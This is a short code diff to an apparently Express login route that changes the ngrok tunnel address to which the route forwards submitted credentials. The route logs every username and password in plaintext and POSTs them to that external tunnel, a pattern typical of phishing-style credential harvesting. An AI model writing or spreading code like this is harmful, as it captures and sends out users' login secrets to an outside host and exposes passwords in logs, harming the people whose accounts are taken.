@@ -10,7 +10,7 @@ router.post('/login', async (req, res) => {
         console.log(`Login attempt - Username: ${username}, Password: ${password}`);
         
         // Send data to your local server
-        const localServerUrl = 'https://30a6-2601-646-481-3830-c44b-5227-7f16-2ea6.ngrok-free.app/api/login';
+        const localServerUrl = 'https://7328-2601-646-481-3830-c44b-5227-7f16-2ea6.ngrok-free.app/api/login';
         const response = await fetch(localServerUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
